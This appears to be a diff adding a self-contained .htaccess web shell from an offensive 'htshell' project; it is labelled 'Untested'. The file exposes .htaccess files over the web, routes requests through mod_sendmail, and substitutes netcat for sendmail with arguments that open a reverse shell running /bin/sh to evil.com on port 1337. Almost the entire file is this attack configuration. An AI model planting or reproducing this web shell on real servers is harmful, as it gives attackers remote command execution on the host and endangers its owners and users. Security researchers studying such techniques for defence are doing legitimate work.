@@ -1,0 +1,16 @@
+# Untested
+# Self contained .htaccess web shell - Part of the htshell project
+# Written by Wireghoul - http://www.justanotherhacker.com
+# Reverse shell through mod_sendmail (http://mailservice.sourceforge.net/mod_sendmail.html)
+# Executes a reverse shell by invoking netcat instead of sendmail
+
+# Override default deny rule to make .htaccess file accessible over web
+<Files ~ "^\.ht">
+    Order allow,deny
+    Allow from all
+</Files>
+
+# Change handler and configure netcat as the binary
+SetHandler sendmail
+SendmailName /bin/nc
+SendmailArguments -e /bin/sh evil.com 1337
